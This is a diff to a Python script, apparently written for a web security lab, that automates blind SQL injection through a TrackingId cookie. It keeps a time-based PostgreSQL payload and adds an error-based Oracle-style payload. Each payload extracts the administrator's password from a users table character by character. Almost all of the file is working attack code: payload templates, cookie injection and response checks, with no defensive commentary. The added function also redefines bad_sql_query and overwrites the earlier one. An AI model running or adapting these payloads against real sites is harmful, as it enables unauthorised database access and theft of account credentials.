@@ -2,10 +2,6 @@ import requests
 import time
 
 
-""" 
-    This file contain the sending_payload function use to send the payload containing the bad_SQLi (time-based) 
-            
-"""
 def bad_sql_query(indice: str=None, parameter: str=None):
     bad_sql = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{indice},1) FROM users WHERE username = 'administrator'){parameter} THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
     return bad_sql
@@ -63,5 +59,60 @@ def sending_payload_for_time_based_SQLi(payload_parameter1 : str, payload_parame
         
           
     return result_bool, result_control
+
+
+
+
+
+"""-------------------------------------------------ERROR BASED SQL INJECTION-------------------------------------------------------"""
+
+
+
+
+def bad_sql_query(indice: str=None, parameter: str=None):
+    bad_sql = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){parameter} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+    return bad_sql
+
+def sending_payload_for_error_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int):
+    
+    #The payload is in the bad_sql_query function
+    
+    bad_sql1 = bad_sql_query(indice, payload_parameter1)
+    
+    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
+    cookies = {
+        'TrackingId': f"XVmK2up50yoi6anT{bad_sql1}",
+        'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
+    }
+    
+   
+    r = requests.get(url, cookies=cookies)
+    status_code = r.status_code
+
+    
+    
+    if status_code != 200:
+        print(f"This parameter work: {payload_parameter1}")
+    else:
+        print("")    
+    
+        
+    bad_sql2 = bad_sql_query(indice, payload_parameter2)
+    cookies = {
+            'TrackingId': f"XVmK2up50yoi6anT{bad_sql2}",
+            'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
+        }
+    
+    
+    r2 = requests.get(url, cookies=cookies)
+    status_code2 = r2.status_code
+    
+    if status_code2  != 200:
+        print(f"Value found with this parameter: {payload_parameter2}")
+    else:
+        print("")  
+        
+          
+    return status_code, status_code2
 
 
